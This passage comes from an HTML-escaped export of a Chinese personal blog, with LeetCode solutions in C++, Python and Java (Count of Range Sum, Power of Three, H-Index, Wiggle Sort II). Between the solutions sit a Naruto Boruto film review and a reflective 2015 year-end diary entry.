LL;struct SegmentTreeNode &#123; LL L, R; int cnt; SegmentTreeNode *left, *right; SegmentTreeNode(LL L, LL R) :L(L), R(R), cnt(0), left(NULL), right(NULL) &#123;&#125;&#125;;class SegmentTree &#123; SegmentTreeNode * root; SegmentTreeNode * buildTree(vector&lt;LL&gt; &amp;nums, int L, int R) &#123; if (L &gt; R) return NULL; SegmentTreeNode * root &#x3D; new SegmentTreeNode(nums[L], nums[R]); if (L &#x3D;&#x3D; R) return root; int mid &#x3D; (L + R) &gt;&gt; 1; root-&gt;left &#x3D; buildTree(nums, L, mid); root-&gt;right &#x3D; buildTree(nums, mid + 1, R); return root; &#125; void update(SegmentTreeNode * root, LL val) &#123; if (root &amp;&amp; root-&gt;L &lt;&#x3D; val &amp;&amp; val &lt;&#x3D; root-&gt;R) &#123; root-&gt;cnt++; update(root-&gt;left, val); update(root-&gt;right, val); &#125; &#125; int sum(SegmentTreeNode * root, LL L, LL R) &#123; if (!root || root-&gt;R &lt; L || R &lt; root-&gt;L ) return 0; if (L &lt;&#x3D; root-&gt;L &amp;&amp; root-&gt;R &lt;&#x3D; R) return root-&gt;cnt; return sum(root-&gt;left, L, R) + sum(root-&gt;right, L, R); &#125;public: SegmentTree(vector&lt;LL&gt; &amp;nums, int L, int R) &#123; root &#x3D; buildTree(nums, L, R); &#125; int sum(LL L, LL R) &#123; return sum(root, L, R); &#125; void update(LL val) &#123; update(root, val); &#125;&#125;;class Solution &#123;public: int countRangeSum(vector&lt;int&gt;&amp; nums, int lower, int upper) &#123; if (nums.size() &#x3D;&#x3D; 0) return 0; vector&lt;LL&gt; sum_array (nums.size(),0); sum_array[0] &#x3D; nums[0]; for (int i &#x3D; 1; i &lt; sum_array.size(); i++) &#123; sum_array[i] &#x3D; nums[i] + sum_array[i - 1]; &#125; LL sum &#x3D; sum_array[sum_array.size() - 1]; sort(sum_array.begin(), sum_array.end()); auto t &#x3D; unique(sum_array.begin(), sum_array.end()); SegmentTree tree(sum_array, 0, t - sum_array.begin() - 1); int ans &#x3D; 0; for (int i &#x3D; nums.size() - 1; i &gt;&#x3D; 0; i--) &#123; tree.update(sum); sum -&#x3D; nums[i]; ans +&#x3D; tree.sum(lower + sum,upper + sum); &#125; return ans; &#125;&#125;; Binary indexed tree (Fenwick tree) 关于此树的介绍： Binary indexed tree (Fenwick tree) 注意要加入upper 和 lower -1 两个点 (python 版本比C++简洁太多了^ ^,建议看py版本) C++ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859typedef long long LL;class FenwickTree &#123; vector&lt;int&gt; sum_array; int n; inline int lowbit(int x) &#123; return x &amp; -x; &#125;public: FenwickTree(int n) :n(n), sum_array(n + 1, 0) &#123;&#125; void add(int x, int val) &#123; while (x &lt;= n) &#123; sum_array[x] += val; x += lowbit(x); &#125; &#125; int sum(int x) &#123; int res = 0; while (x &gt; 0) &#123; res += sum_array[x]; x -= lowbit(x); &#125; return res; &#125;&#125;;class Solution &#123;public: int countRangeSum(vector&lt;int&gt;&amp; nums, int lower, int upper) &#123; if (nums.size() == 0) return 0; vector&lt;LL&gt; sum_array (nums.size() * 3,0); LL sum = 0; for (int i = 0; i &lt; nums.size(); i++) &#123; sum += nums[i]; sum_array[i * 3] = sum; sum_array[i * 3 + 1] = sum + lower - 1; sum_array[i * 3 + 2] = sum + upper; &#125; sum_array.push_back(upper); sum_array.push_back(lower - 1); unordered_map&lt;LL, int&gt; index; sort(sum_array.begin(), sum_array.end()); auto end = unique(sum_array.begin(), sum_array.end()); auto it = sum_array.begin(); for (int i = 1; it != end;i++,it++) &#123; index[*it] = i; &#125; FenwickTree tree(index.size()); int ans = 0; for (int i = nums.size() - 1; i &gt;= 0; i--) &#123; tree.add(index[sum],1); sum -= nums[i]; ans += tree.sum(index[upper + sum]) - tree.sum(index[lower + sum -1]); &#125; return ans; &#125;&#125;; Python 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class FenwickTree(object): def __init__(self, n): self.sum_array = [0] * (n + 1) self.n = n def lowbit(self, x): return x &amp; -x def add(self, x, val): while x &lt;= self.n: self.sum_array[x] += val x += self.lowbit(x) def sum(self, x): res = 0 while x &gt; 0: res += self.sum_array[x] x -= self.lowbit(x) return resclass Solution(object): def countRangeSum(self, nums, lower, upper): &quot;&quot;&quot; :type nums: List[int] :type lower: int :type upper: int :rtype: int &quot;&quot;&quot; if not nums: return 0 sum_array = [upper, lower - 1] total = 0 for num in nums: total += num sum_array += [total, total + lower - 1, total + upper] index = &#123;&#125; for i, x in enumerate(sorted(set(sum_array))): index[x] = i + 1 tree = FenwickTree(len(index)) ans = 0 for i in xrange(len(nums) - 1, -1, -1): tree.add(index[total], 1) total -= nums[i] ans += tree.sum(index[upper + total]) - tree.sum(index[lower + total - 1]) return ans 本文是 leectode 327 Count of Range Sum 的题解， 更多leetcode题解见 https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Power of Three","slug":"leetcode-power-of-three","date":"2016-01-08T04:27:12.000Z","updated":"2021-01-08T13:32:16.859Z","comments":true,"path":"leetcode-power-of-three/","link":"","permalink":"https://www.hrwhisper.me/leetcode-power-of-three/","excerpt":"leetcode Power of Three Given an integer, write a function to determine if it is a power of three. Follow up: Could you do it without using any loop / recursion?","text":"leetcode Power of Three Given an integer, write a function to determine if it is a power of three. Follow up: Could you do it without using any loop / recursion? 题目地址： leetcode Power of Three 题目大意： 给定一个整数，判断是否是3的整数幂 思路 方法一 循环判断，每次除以3 C++ 1234567891011class Solution &#123;public: bool isPowerOfThree(int n) &#123; if(n &lt;= 0) return false; while(n &gt; 1)&#123; if(n %3 != 0) return false; n/=3; &#125; return true; &#125;&#125;; Python 1234567891011class Solution(object): def isPowerOfThree(self, n): &quot;&quot;&quot; :type n: int :rtype: bool &quot;&quot;&quot; if n &lt;= 0: return False while n != 1: if n % 3 != 0: return False n /= 3 return True 方法二 递归 C++ 12345678class Solution &#123;public: bool isPowerOfThree(int n) &#123; if (n &lt;= 0) return false; if (n == 1) return true; return n % 3 == 0 &amp;&amp; isPowerOfThree(n / 3); &#125;&#125;; Python 123456789class Solution(object): def isPowerOfThree(self, n): &quot;&quot;&quot; :type n: int :rtype: bool &quot;&quot;&quot; if n &lt;= 0: return False if n == 1: return True return n % 3 == 0 and self.isPowerOfThree(n / 3) 方法三 取对数 C++ 123456class Solution &#123;public: bool isPowerOfThree(int n) &#123; return n &gt; 0 &amp;&amp; pow(3, round(log(n) / log(3))) == n; &#125;&#125;; Java 12345class Solution &#123; public boolean isPowerOfThree(int n) &#123; return n &gt; 0 &amp;&amp; Math.pow(3, Math.round(Math.log(n) / Math.log(3))) == n; &#125;&#125; Python 1234567class Solution(object): def isPowerOfThree(self, n): &quot;&quot;&quot; :type n: int :rtype: bool &quot;&quot;&quot; return n &gt; 0 and 3 ** round(math.log(n, 3)) == n 本文是leetcode 326 Power of Three 题解，更多本博客题解见 https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 274 H-Index || 275 H-Index II","slug":"leetcode-h-index-h-index-ii","date":"2016-01-05T14:01:02.000Z","updated":"2020-10-26T15:19:34.876Z","comments":true,"path":"leetcode-h-index-h-index-ii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-h-index-h-index-ii/","excerpt":"leetcode 274 H-Index Given an array of citations (each citation is a non-negative integer) of a researcher, write a function to compute the researcher's h-index. According to the definition of h-index on Wikipedia: \"A scientist has index h if h of his/her N papers have at least h citations each, and the other N − h papers have no more than h citations each.\" For example, given citations = [3, 0, 6, 1, 5], which means the researcher has 5 papers in total and each of them had received 3, 0, 6, 1, 5 citations respectively. Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, his h-index is 3. Note: If there are several possible values for h, the maximum one is taken as the h-index. Hint: An easy approach is to sort the array first. What are the possible values of h-index? A faster approach is to use extra space.","text":"leetcode 274 H-Index Given an array of citations (each citation is a non-negative integer) of a researcher, write a function to compute the researcher's h-index. According to the definition of h-index on Wikipedia: \"A scientist has index h if h of his/her N papers have at least h citations each, and the other N − h papers have no more than h citations each.\" For example, given citations = [3, 0, 6, 1, 5], which means the researcher has 5 papers in total and each of them had received 3, 0, 6, 1, 5 citations respectively. Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, his h-index is 3. Note: If there are several possible values for h, the maximum one is taken as the h-index. Hint: An easy approach is to sort the array first. What are the possible values of h-index? A faster approach is to use extra space. 题目地址： leetcode H-Index 题意： 给定一个数组代表论文被引用次数。要求计算h-index。 h-index定义如下： 一个学者发表的n篇论文中，他有h篇被引用至少h次，而其他的n-h篇被引用次数都不超过h。 思路： 显然，答案的范围为[0,n]，n为数组的长度。 方法一 从高到底排序，然后对排完序的数组扫描。 对于i，h-index为min(i,citations[i]) C++ 12345678910class Solution &#123;public: int hIndex(vector&lt;int&gt;&amp; citations) &#123; sort(citations.begin(), citations.end(),greater&lt;int&gt;()); for (int i = 0; i &lt; citations.size(); i++) if (i &gt;= citations[i]) return i; return citations.size(); &#125;&#125;; Python 12345678class Solution(object): def hIndex(self, citations): &quot;&quot;&quot; :type citations: List[int] :rtype: int &quot;&quot;&quot; if not citations: return 0 return max([min(i + 1, c) for i, c in enumerate(sorted(citations, reverse=True))]) 也可以 1234567class Solution(object): def hIndex(self, citations): &quot;&quot;&quot; :type citations: List[int] :rtype: int &quot;&quot;&quot; return sum([i &lt; c for i, c in enumerate(sorted(citations, reverse=True))]) 如果不倒着排,则可以这么写： n - i 是大于引用数citations[i]的个数。 对于i，h-index 为min(n - i,citations[i]) C++ 1234567891011class Solution &#123;public: int hIndex(vector&lt;int&gt;&amp; citations) &#123; sort(citations.begin(), citations.end()); int n = citations.size(); for (int i = 0; i &lt; n; i++) if (citations[i] &gt;= n - i) return n - i; return 0; &#125;&#125;; Python 12345678class Solution(object): def hIndex(self, citations): &quot;&quot;&quot; :type citations: List[int] :rtype: int &quot;&quot;&quot; if not citations: return 0 return max([min(len(citations) - i, c) for i, c in enumerate(sorted(citations))]) 方法二 对引用数进行计数。这样就不需要排序啦~ 1234567891011121314151617181920class Solution(object): def hIndex(self, citations): &quot;&quot;&quot; :type citations: List[int] :rtype: int &quot;&quot;&quot; if not citations: return 0 n = len(citations) cnt = [0] * (n + 1) for c in citations: if c &lt; n: cnt[c] += 1 else: cnt[n] += 1 t = 0 for i in xrange(n, -1, -1): t += cnt[i] if t &gt;= i: return i return 0 leetcode 275 H-Index II Follow up for H-Index: What if the citations array is sorted in ascending order? Could you optimize your algorithm? Hint: Expected runtime complexity is in O(log n) and the input is sorted. 题目地址： leetcode H-Index II 题意： 就是要求时间复杂度为O(log n) 的H-Index,数组已经升序排好 思路： 二分，枚举答案[0,n] 12345678910111213141516class Solution(object): def hIndex(self, citations): &quot;&quot;&quot; :type citations: List[int] :rtype: int &quot;&quot;&quot; L, R, n = 0, len(citations), len(citations) while L &lt; R: mid = (L + R) &gt;&gt; 1 if n - mid &lt;= citations[mid]: R = mid else: L = mid + 1 return n - L","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"【十五年最后一别】再见，火影","slug":"boruto-naruto-the-movie-boruto-movie-comments","date":"2016-01-05T03:21:08.000Z","updated":"2021-01-08T13:42:14.028Z","comments":true,"path":"boruto-naruto-the-movie-boruto-movie-comments/","link":"","permalink":"https://www.hrwhisper.me/boruto-naruto-the-movie-boruto-movie-comments/","excerpt":"火影忍者 剧场版 博人传 影评","text":"火影忍者 剧场版 博人传 影评 影评 从小学开始看火影。 从打再不斩，到中忍考试，再到三代目尸鬼封尽，佐助投奔大蛇丸…… 从鸣人小时候受尽村里人们的唾弃，到成为拯救全村的英雄， 猿飞之死，阿斯玛之死，自来也之死，宁次之死…… 火影中有太多令人感动的情节。 如果可以，多么希望能看着鸣人和佐助的羁绊一直这么下去，还希望看到鸣人的嘴遁，傲娇的佐助，永远的招牌性的影分身和螺旋丸…… 于是时间一年年过去， 一直到前年…… 是的，前年。 时光多残忍，它不是红了樱桃，绿了芭蕉，而是把过去的日子不断的向后推移，从去年到前年。 漫画完结的时候，看完了最后一话，一遍又一遍。 鸣人终于如愿以偿的当上了火影，天下太平。 而我看来，为什么有一种追了十几年的姑娘嫁人了的感觉，怅然若失。 The Last 那时最为最后一部剧场版，自然我是期待很久，但只是说明了“鸣人终于懂得自己想守护的人是谁（雏田）”，佐二少仅仅出场一面，实在难以作为最后一部。 好在AB有自知自明，推出了《博人传》。 从本次剧场版的一开始，鸣人扮演一个工作狂人，几乎不顾家； 而博人则像是一个缺爱的孩子：为什么自己老爸（鸣人）一点都不关心我？ 于是，博人丢掉鸣人的小时候的衣服，拜佐助为师，研究鸣人的弱点，只为了打败他。 非法使用忍具，只为让自己爸爸得到认可…… 只是，他永远穿着崭新的衣服， 他不懂，师傅为什么说“你不必要理解现在的鸣人是怎样的，你要认识一路走来成就了自己的鸣人“ …… 后来他穿上了鸣人小时候的衣服，雏田一阵恍惚。 和小时候的鸣人一模一样。 看得我也是热泪盈眶，时间仿佛跨越了十几年，小时候的鸣人，小时候的我们。 boruto-naruto-the-movie-boruto-like-naruto-child-1 当最后熟悉的音乐响起，当最后的BOSS不再是鸣人用螺旋丸给以最后一击，而是博人挥舞起螺旋丸打倒BOSS， 我就知道，我们年少的时光，一去不复返了。 boruto-naruto-the-movie-boruto-final-hit-1 boruto-naruto-the-movie-boruto-final-hit-2 老一辈有许许多多的英雄，在刀光剑影中前行，用鲜血重新为忍界铸造秩序，换来和平。 但岁月不饶人， 就连鸣人也步入中年，渐渐老去，这是造化的规律，无可避免。 当那些英雄的故事成为历史， 成为那些萦绕在后人耳边的故事， 我们并非是要让他们也成为英雄， 而是希望他们有那些高尚的品德。 当传奇谢幕犹如落叶飘零， 看起来凄凉满是时光的刀痕， 但它会成为新生绿叶的养分， 而火的意志就这样传播下去， 一代又一代…… 祝福你孩子， 也祝福这和平的年代。 其他 • 雏田贤妻良母类型，好评点赞 • 八尾就这么去了，卧槽 • 博人和萨拉搞一起，他们孩子会多厉害→_→（白眼+写轮眼会变成啥？还有漩涡一族的血脉=v=） boruto-naruto-the-movie-boruto-chutian 在ps: 2月份去电影院看的时候，感觉鸣人去档尾兽玉的时候也好感人。 就像历代火影守护村子的一样，鸣人也勇敢的站了出来。 那个小男孩长大了啊。 boruto-naruto-the-movie-boruto-cinema 资源 火影忍者剧场版：博人传.韩版.HD1280 高清日韩双语中字 火影忍者《博人传》将于2016年2月18日上映！ 请到影院支持下火影！=v= 博主虽然看过但是还想去看一次。。 要资源的话等上映完再重新放上来。 update:2016.3.22, 重新放上链接 链接：http://pan.baidu.com/s/1nufUl8t 密码：1zo2 一上传就被和谐，不发了","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"生活","slug":"生活","permalink":"https://www.hrwhisper.me/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"2015年总结","slug":"goodbye-2015-hello-2016","date":"2016-01-01T15:54:20.000Z","updated":"2021-01-08T13:42:14.094Z","comments":true,"path":"goodbye-2015-hello-2016/","link":"","permalink":"https://www.hrwhisper.me/goodbye-2015-hello-2016/","excerpt":"关于理想，关于爱情，关于15年发生的事情。 时间总会磨钝那些记忆的边缘。 想要抹去尘封已久记忆的尘埃，让它重新浮现愈发困难。 倒不如记下所思所想，留着将来某一天查阅。","text":"关于理想，关于爱情，关于15年发生的事情。 时间总会磨钝那些记忆的边缘。 想要抹去尘封已久记忆的尘埃，让它重新浮现愈发困难。 倒不如记下所思所想，留着将来某一天查阅。 前言-流水账 吐槽模式开启。 四月的时候，去面了阿里巴巴实习生，C++的岗位，做的项目都不是C++的，就没往简历上写，于是处女面就这么挂掉了。（Too young too simple , naive） 报夏令营的时候，傻傻的很晚才报UCAS，人家夏令营已经收一半人了，还好最后还是收了我 = = 也和不在fzu有关，自动选的课被记缺考，绩点直降0.07，厚着脸皮拜托班长给我到处跑消掉了它。 然后不想再麻烦人给我找老师写推荐信了，又不好意思找RUC的老师写(毕竟人家一直想让我去他们实验室，不去还找他们写= =）。于是好多夏令营都没报。（UCAS只要一个老师的，还是表格的形式，就没写几个字^^所以才报） 九月的时候回学校，也是转学分的事情焦头烂额，心乱如麻，焦急万分，天天跑教学办，然后等RUC的成绩单。 必修课要求对应，选修课任意，总的要求是RUC的课学分不能少于福大0.5= =否则不给换。 幸好有获奖可以申请学分，不然实践选修的课就得补到哭了。（RUC的实践课和理论课不区分，而福大可以不上实践课，如果你不选） 然后用《算法分析与设计》骗过了老师，抵消了必修课《计算方法》 最后只要三门课：电气工程实践、计算机系统结构、还有个0学分的坑：就业与创业指导。 提交后，登记成绩的老师死活不肯给我马上登，非要等10月份，那时候保研都结束了好么= = RANK 1的保不了不是坑爹么 于是和辅导员说啊，然后让老师去催啊，终于在学院保研资格的前一天转化完了。。。T^T 还有就是之前把宿舍退了，回来后安排给了个新生住，我还不知道= =差点被坑。后来找辅导员解决了。 之后开始学车，驾照水水的考完了（99，100，100，100），说要开始做毕设，结果只是学了我要做的毕设相关的东西：django / d3 / mongodb。。。。。。 吐槽完毕。 文艺模式开启。 15年越来越喜欢巴萨， 比起和舍友去电影院看《寻龙决》 我反倒是选择在宿舍看巴萨vs河床世俱杯决赛，有幸看你们踢球，我的幸运。 错过了外星人大罗，精灵小罗，贝克汉姆的圆月弯刀……又怎么能错过你， 我的红蓝军团。 博客最开始是用来写心情，后来，不再写了。 于是再也没见过slashXX_xu,曾和我一样写着心情的孩子。 不知在茫茫人海中，现在他去往何处。 2015年12月31日，上了最后一节大学的专业课。 晚上自己在宿舍，出去跑了个步，看到好多人在放孔明灯， 放孔明灯就能实现愿望吗？ 也许，那只是人们的寄托， 我们要记得诗和远方， 好好的生活。 北京四月 京城一怪，柳絮纷飞。 “未若柳絮因风起” 这句原来是用来比拟雪花纷飞的场景。 我一直不解，直到四月的北京。 那一刻我才明白了 未若柳絮因风起 这是何等的境界。 所以也明白了杨花漫漫搅天飞，之后柳条折尽花飞尽的心酸—— 你听，那漫天飞舞的不是柳絮， 那是风与树的歌。 Wyman 黄伟文 15年愈发的喜欢wyman黄伟文。 当年，舍友和我说，黄伟文的词还不错。 我那时天真的说，黄伟文是谁。 那时候太过年轻只知道林夕。 后来才知道，原来陈奕迅好多词都是黄伟文写的。 比如《单车》比如《1874》，比如《落花流水》、《沙龙》还有《葡萄成熟时》 本来纪念张国荣的曲调，加上黄伟文惊为天人的词，演绎了一曲《浮夸》。 歌名串烧林夕有《K歌之王》，而黄伟文更是全部歌名组成的歌词叫《新歌+精选》 如果现在填词还分门派的话，林夕大概是婉约派，而黄伟文则是豪放派。 林夕是伤春悲秋的，把“得不到”用苦情三部曲（《春秋》、《钟无艳》、《一丝不挂》）演绎得淋漓尽致，完全是卑微到尘埃里，渴望一丝爱情，而黄伟文则不会跪着爱，不爱就离开。 不信你看： 《春秋》 -张敬轩 -林夕 我没有运气放大自私的失意 更没有道理在这日你得到真爱制造恨意 想心酸 还可以 想心底 留根刺 至少要见面上万次 《那谁》-苏永康 -黄伟文 谁没两个致命旧爱侣 不见得 就要听到春天也恐惧 可以不唏嘘 可以不心虚 放低跨过去 分手后，黄伟文说，限我对你以半年时间慢慢的《心淡》，然后放低跨过去，跨过去就好。 如果你爱人背叛了你，林夕是觉得自己《老了十岁》，“善变没有罪却是壮举，为一个你难承受痛苦是我的不对。” 黄伟文则是诅咒《你没有好结果》，“等欣赏你被某君 一刀插入你心，让你一生最喜欢和珍惜那人,也摧毁你一生完全没半点恻隐\", 然后要《活得比你好》，“来让你今天碰见，那日离弃我，原是你损失。“ 也许你觉得wyman这词太狠，但我喜欢这真性情，你还能让失恋的人怎么样呢？不被爱已经是最大的惩罚。 垃圾四部曲（《垃圾》《绝》《破相》《漩涡》）、病态三部曲（《十面埋伏》《防不胜防》《打回原形》）也是绝佳。 林夕的辞藻华丽，而wyman的词，初看朴实无华，某日在听确如平地惊雷。 就像《苦瓜》写的那样 “大概今生有些事，是提早都不可以，明白其妙处” 那时候我们年轻，不懂半生瓜的味道，不懂自己想要的是什么。 那时候我们年轻，不懂千金难买时光的珍贵。 但是没关系啊，在那之前， 你当我是苦瓜吧，加几声嘘声也不怕。 总有一天，葡萄会成熟的，静静的等就好。 最近在看concert YY黄伟文作品展，才发现，有一些歌特别好！ 最感动的情节是，杨千嬅和wyman世纪一抱，“相逢一笑泯恩仇” 当他们从舞台缓缓下去，而陈奕迅陈奕迅的《最佳损友》响起的时候， 眼睛是湿润的，人《活着多好》，能看到自己喜欢的事物。 如果还有一次作品展，我一定得去。 “林夕引进门，皈依黄伟文。” 大抵就是说我吧。 欣赏林夕，却偏爱黄伟文。 附 信手拈来的好词， 比如病态三部曲： 《防不胜防》： 你就算知，也不会想是我。 《十面埋伏》： 总差一点点先可以再会面 悔不当初轻轻放过 现在惩罚我 分手分错了么 分开一千天 天天盼再会面 只怕使你先找到我 但直行直过 天都帮你去躲 躲开不见我 比如《陀飞轮》： “劳力是无止境 活著多好不需要靠物证 也不以高薪高职高级品搏尊敬 就算搏到伯爵那地位和萧邦的隽永 卖了任性日拼夜拼忘掉了为什么高兴 曾付出几多心跳 来换取一堆堆的发票 人值得 命中减少几秒 多买一只表 秒速 捉得紧了 而皮肤竟偷偷松了” 他问我们：你献出了十寸 时和分 可有换到十寸金? …… 说来说去，其实我最喜欢的歌是《苦瓜》， 今天先记得听过人说这叫半生瓜 那意味着它的美年轻不会洞察吗 到大悟大彻将一切都升华 这一秒坐拥晚霞 我共你觉得苦也不太差 lussa RUC春假的时候去了北戴河一趟。 然后大家在撮合我和lussa。 最初没有多大注意这个姑娘。 只不过回来后，聊着聊着，我觉得要是将来在一起的话也不错。 为此报了RUC的夏令营。 后来，我觉得，兴许是周围人的声音蒙蔽了我的眼睛， 其实并没有多大的感情。 对她是理智而不是感性，很显然，并不爱她。 你所描绘的未来种种，可有我的痕迹么？ 从9月决定去UCAS而不是RUC的一刻，就不再联系她。 也许她还在惊诧于为什么突然就不再联系， 其实哪有突然一说，所有离开的伏笔，早已在昨日埋下，只不过在某个阳光灿烂的日子里，掀开帷幕，拉起汽笛，驶向远方。 此时，转身离去，沉默就是最好的告别。 关于EX 分手已经是14年的事情了。 想要复合却总是看不到希望。 想不出多少次如此，拒我于门外，不愿见我。 明白我内心的独白，却总是无动于衷。 一扇门的距离，之间隔着天涯。 我曾无比的爱她，也曾因此无比的恨她。 把《原谅》那首歌，来来回回的听了上百遍，就真的能原谅么？ 原谅一个不爱你的人，所做的一切当然都是理所当然。 回到fzu后，某一天看到空间，她说，“那个人还是我曾经喜欢的模样，但再也不是”。 从看到那句的时候起，屏蔽了她空间所有动态。 真想评论一下 “谢谢”你曾经这么“喜欢” 过我。 喜欢过么，喜欢一个人绝不是这个样子的。 隔了不久后的某一天，她问我，当初给她保管的杯子还要吗。 我很想说不要，既然你不再喜欢，我拿着又有何用。 却又怕伤害那脆弱得友情如同陌生人的关系。 于是，每一句话都要思衬良久。 曾经有满腹的话，想要诉说，如今，话到嘴边的时候， 却不知道说什么，简单的几个字回复，却要等了半天才发送。 句子之间的距离却如此遥远， 段与段之间总有无尽的留白。 多么讽刺的结果。 再到后来，让舍友给我顺带了月饼，让学妹顺路带了苹果。 看上去好像附属品一样。 给别人的和给我的都一样，那我就不要了。 我早已学会了不会再抱有幻想，不再把她看得那么重要。 即使后来看到关于感情的微博，也学会冷眼旁观，漠然视之。 也许与我有关，但那又怎样呢。 我很喜欢某天在豆瓣上看到的一段话： 明镜说：“你知道吗？曾经有一个十六岁的女孩子，就像你现在一样，站在我家门口，她告诉我，她要嫁给我弟弟。我告诉她，行，除非我死！你知道她怎么回答的？她说，行，我就等到你死的那一天！所以，那个疯女人到现在依然没有嫁。我厌恶那个疯子的一切，唯独承认她爱人的勇气。我欣赏你的一切，唯独……”她在措辞，毕竟不想把关系搞僵，“唯独不相信，你会爱他到永远。” 唯独不相信，她会爱我到永远—— 她曾为我们之间努力过么？ 不曾吧，不会吧。 所以我淡然。 当15年最后一天，我独自在宿舍里的听歌，某首歌的旁白甚得我心： “我谁也没等，谁也不会来” 年末的倒数计时又开始的时候，夜空继续享有烟花绽放的美丽。 稍众即逝的光照亮所有人的脸庞， 时间，也从2015跳到了2016， 时间是崭新的， 空气是清新的， 似乎一切都是新的，可谁来改写我们如标语般押韵而规律的心跳？ 我相信也许你也曾付出过真心，就如同我的每一次付出都是真心的一样。 只不过你总是粗心，不如我这般细心。 从你不断的说再见后，就没有了以后。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"沙海拾贝","slug":"whisper/沙海拾贝","permalink":"https://www.hrwhisper.me/categories/whisper/%E6%B2%99%E6%B5%B7%E6%8B%BE%E8%B4%9D/"}],"tags":[]},{"title":"leetcode Wiggle Sort II","slug":"leetcode-wiggle-sort-ii","date":"2015-12-31T10:08:05.000Z","updated":"2021-01-08T13:32:16.887Z","comments":true,"path":"leetcode-wiggle-sort-ii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-wiggle-sort-ii/","excerpt":"leetcode Wiggle Sort II Given an unsorted array nums, reorder it such that nums[0] &lt; nums[1] &gt; nums[2] &lt; nums[3].... Example: (1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. (2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2]. Note: You may assume all input has valid answer. Follow Up: Can you do it in O(n) time and/or in-place with O(1) extra space?","text":"leetcode Wiggle Sort II Given an unsorted array nums, reorder it such that nums[0] &lt; nums[1] &gt; nums[2] &lt; nums[3].... Example: (1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. (2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2]. Note: You may assume all input has valid answer. Follow Up: Can you do it in O(n) time and/or in-place with O(1) extra space? 题目地址： leetcode Wiggle Sort II 题意： 给定一个数组，要求进行如下排序： 奇数的位置要大于两边。 如 nums[1] &gt; nums[0] ，nums[1] &gt; nums[2] 思路: 方法一 排序，然后两边分别取，复杂度O(nlogn) 注意排完序之后应该倒着来。比如[4,5,5,6]这个 数据。 Java 7ms 12345678910111213public class Solution &#123; public void wiggleSort(int[] nums) &#123; Arrays.sort(nums); int[] temp = new int[nums.length]; int s = (nums.length + 1) &gt;&gt; 1, t = nums.length; for (int i = 0; i &lt; nums.length; i++) &#123; temp[i] = (i &amp; 1) == 0 ? nums[--s] : nums[--t] ; &#125; for (int i = 0; i &lt; nums.length; i++) nums[i] = temp[i]; &#125;&#125; Python 104ms 123456789101112131415class Solution(object): def wiggleSort(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: void Do not return anything, modify nums in-place instead. &quot;&quot;&quot; temp = sorted(nums) s, t = (len(nums) + 1) &gt;&gt; 1, len(nums) for i in xrange(len(nums)): if i &amp; 1 == 0: s -= 1 nums[i] = temp[s] else: t -= 1 nums[i] = temp[t] 方法二 用快排的思想查找中位数，然后再合并两边。 最坏复杂度O(n^2)，平均复杂度O(n) Java 6ms 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Solution &#123; public void wiggleSort(int[] nums) &#123; int medium = findMedium(nums, 0, nums.length - 1, (nums.length + 1) &gt;&gt; 1); int s = 0, t = nums.length - 1 , mid_index = (nums.length + 1) &gt;&gt; 1; int[] temp = new int[nums.length]; for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] &lt; medium) temp[s++] = nums[i]; else if (nums[i] &gt; medium) temp[t--] = nums[i]; &#125; while (s &lt; mid_index) temp[s++] = medium; while (t &gt;= mid_index) temp[t--] = medium; t = nums.length; for (int i = 0; i &lt; nums.length; i++) nums[i] = (i &amp; 1) == 0 ? temp[--s] : temp[--t]; &#125; private int findMedium(int[] nums, int L, int R, int k) &#123; if (L &gt;= R) return nums[R]; int i = partition(nums, L, R); int cnt = i - L + 1; if (cnt == k) return nums[i]; return cnt &gt; k ? 